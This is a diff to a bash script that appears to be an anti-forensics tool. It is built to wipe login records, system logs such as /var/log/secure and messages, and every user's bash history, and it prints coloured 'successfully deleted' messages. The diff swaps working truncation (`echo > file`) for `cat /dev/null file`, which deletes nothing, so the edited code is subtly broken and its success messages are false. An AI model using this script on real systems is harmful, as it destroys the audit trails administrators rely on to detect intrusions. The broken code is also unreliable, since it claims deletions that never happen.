@@ -40,15 +40,21 @@ banner() {
 }
 
 remove_login() {
-    echo > /var/log/wtmp
-    echo > /var/log/btmp
-    echo > /var/log/lastlog
+    cat /dev/null /var/log/wtmp 2>/dev/null
+    cat /dev/null /var/log/btmp 2>/dev/null
+    cat /dev/null /var/log/lastlog 2>/dev/null
+}
+
+other_logs() {
+    cat /dev/null /var/log/messages 2>/dev/null
+    cat /dev/null /var/log/maillog 2>/dev/null
+    cat /dev/null /var/log/secure 2>/dev/null
 }
 
 bash_history() {
     for bash_history in $(find / -name ".bash_history" 2>/dev/null)
         do
-            echo > $bash_history
+            cat /dev/null $bash_history 2>/dev/null
     done
 }
 
@@ -59,9 +65,9 @@ logs_f() {
 
     while read log_f
         do
-            echo > $log 2>&1
+            cat /dev/null $log_f 2>/dev/null
             printf "\n\033[0;32m[+] \033[0;37mLog deleted: $log_f"
-    done<.logs
+    done < .logs
     rm -f .logs
 }
 
@@ -69,9 +75,12 @@ main() {
     banner
     sleep 1
     printf '\n\033[0;34m[*] \033[0;37mClearing system login logs\n'
-    sleep 1
     remove_login
     printf '\033[0;32m[+] \033[0;37mLogin logs successfully deleted!\n'
+    sleep 1
+    printf '\n\033[0;34m[*] \033[0;37mClearing other logs\n'
+    other_logs
+    printf '\033[0;32m[+] \033[0;37mOther logs successfully deleted!\n'
     sleep 1
     printf '\n\033[0;34m[*] \033[0;37mClearing system histories\n'
     bash_history
